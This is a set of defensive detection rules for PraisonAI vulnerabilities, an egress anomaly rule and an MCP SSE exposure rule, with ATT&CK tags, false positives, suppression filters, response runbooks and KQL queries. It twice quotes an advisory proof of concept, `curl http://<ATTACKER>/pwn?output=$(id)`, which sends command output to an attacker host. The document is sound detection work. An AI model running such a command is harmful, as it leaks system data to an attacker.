PraisonAI server processes should only egress to known LLM endpoints (OpenAI, Anthropic, Google AI, Azure OpenAI, Ollama). Detects the python/uvicorn runtime, or any child it spawns, making outbound connections to any other public destination — the network manifestation of the PoC's `curl http://<ATTACKER>/pwn?output=$(id)` exfil and post-RCE C2/staging. Rationale: PraisonAI's only legitimate public egress is to LLM provider APIs — anything else from the same process or its descendants is suspicious. Anchored on the article's PoC `curl http://<ATTACKER>/pwn?output=$(id)` exfil. Sysdig confirms attackers automate stage-2 payload pulls and exfil within hours of disclosure, so an allowlist-anti-join is the right shape rather than IOC matching. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://gbhackers.com/praisonai-vulnerability-actively-exploited/
ATT&CKT1041 T1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A newly-onboarded LLM provider (Cohere, Mistral, xAI, etc.) not yet in the allow-list
  • PraisonAI tool that legitimately fetches a remote PDF / web page via web_search or read_url tool
  • Pip / package-manager calls during container start (pulls from pypi.org)
  • Telemetry / error reporting (Sentry, Datadog APM, OpenTelemetry collector) from the praisonai process
  • Self-hosted model server (Ollama / vLLM) reached over a public IP rather than internal DNS
Suppression filter
| where not (RemoteUrl has_any ("pypi.org", "files.pythonhosted.org", "sentry.io", "datadoghq.com", "otel-collector")) | where not (InitiatingProcessCommandLine has "pip install")
Response runbook
1) Triage: check whether the destination is a legit LLM/SaaS the org has approved but hasn't allow-listed — query the DNS history and reverse-DNS / WHOIS for the RemoteIP. Pivot to UC1 (inbound POST /api/v1/runs in the prior 10 min) and UC2 (curl/sh child of python) on the same host. 2) Contain: if confirmed malicious destination, block the IP + domain at egress proxy / firewall, isolate the praisonai host. Rotate any LLM API keys present in the host's env or secret store — they're at the same exposure as code execution. 3) Hunt: extract the full curl/wget command line for IOCs (URL, query parameters with command output like `uid=`, encoded data), feed to threat intel. Sweep the rest of the fleet for outbound to that infra over the last 30 days. Check for additional vulnerable PraisonAI deployments (any host listening on :8005).

PraisonAI MCP SSE server launched with vulnerable defaults (GHSA-x227-pf99-vffg) AIInstallation High
Detects start of the PraisonAI MCP SSE transport (ToolsMCPServer.run_sse / launch_tools_mcp_server) which by default binds 0.0.0.0 and skips the bundled SecurityConfig — exposing unauthenticated tools/call JSON-RPC to anyone who can reach the port. High-fidelity inventory signal for hosts running the vulnerable code path; precondition for the GHSA-described RCE. Rationale: Anchored on the specific Python module path (praisonaiagents.mcp.mcp_server) and entry-point names (launch_tools_mcp_server, ToolsMCPServer, run_sse) called out at src/praisonai-agents/praisonaiagents/mcp/mcp_server.py:245/301 in the advisory. These strings only appear in process command lines when the vulnerable transport is actually being invoked — pre-fix versions (<1.6.59) default to 0.0.0.0 with no middleware wired in, so any hit is a deployed-and-exposed instance.
ATT&CKT1190 T1133 T1059.006
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Production PraisonAI deployment intentionally exposing MCP over SSE behind an authenticated reverse proxy
  • Developer running unit/integration tests for praisonaiagents on a localhost-only bind
  • CI/CD job (GitHub Actions, Jenkins) installing and smoke-testing praisonaiagents
  • Patched version >= 1.6.59 where SecurityConfig.require_auth defaults to True and host defaults to 127.0.0.1
  • Security researcher / blue team reproducing the advisory PoC in a sandbox
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("127.0.0.1","localhost","::1") and InitiatingProcessCommandLine !has "0.0.0.0")
| where not (InitiatingProcessCommandLine has "praisonaiagents" and InitiatingProcessFolderPath has_any ("\\.venv\\","\\venv\\","\\.tox\\","\\site-packages\\tests\\"))
Response runbook
1) Triage: confirm the python/uvicorn process is actually serving SSE — pull the parent script, inspect imports for praisonaiagents.mcp.mcp_server, and check `pip show praisonaiagents` version on the host (< 1.6.59 is vulnerable). Use `netstat -ano | findstr :<port>` (or `ss -ltnp`) to verify the bind address — 0.0.0.0/:: means externally reachable. 2) Contain: if bound to 0.0.0.0 and version < 1.6.59, kill the process (or `systemctl stop` the service), block the listening port at the host firewall, and remove from any load balancer until upgraded to 1.6.59+ with require_auth=True. 3) Hunt: pivot on the same host into DeviceNetworkEvents for inbound connections to that port from non-RFC1918 IPs in the last 30 days, and into DeviceProcessEvents for children of the python PID matching UC2 (shell/LOLBin spawn) — any hit is a likely successful tools/call RCE.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where (FileName in~ ("python.exe","python3.exe","pythonw.exe","python","python3","uvicorn","uvicorn.exe")
      or InitiatingProcessFileName in~ ("python.exe","python3.exe","pythonw.exe","python","python3"))
| where ProcessCommandLine has "praisonaiagents"
    or InitiatingProcessCommandLine has "praisonaiagents"
| where ProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse","transport=\"sse\"","transport='sse'")
    or InitiatingProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse","transport=\"sse\"","transport='sse'")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where TargetProcessName has_any ("python.exe","python3.exe","pythonw.exe","python","python3","uvicorn","uvicorn.exe")
     or ActingProcessName has_any ("python.exe","python3.exe","pythonw.exe","python","python3")
| where TargetProcessCommandLine has "praisonaiagents"
     or ActingProcessCommandLine has "praisonaiagents"
| where TargetProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse","transport=\"sse\"","transport='sse'")
     or ActingProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine,
          ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

description: Detects launch of the vulnerable PraisonAI MCP SSE transport which by default binds 0.0.0.0 with no authentication and no Origin validation. The bundled mcp_security.py controls (validate_auth_header, is_valid_origin, SecurityConfig) are never wired in by the transport, so any reachable host can list and invoke registered tools without credentials.
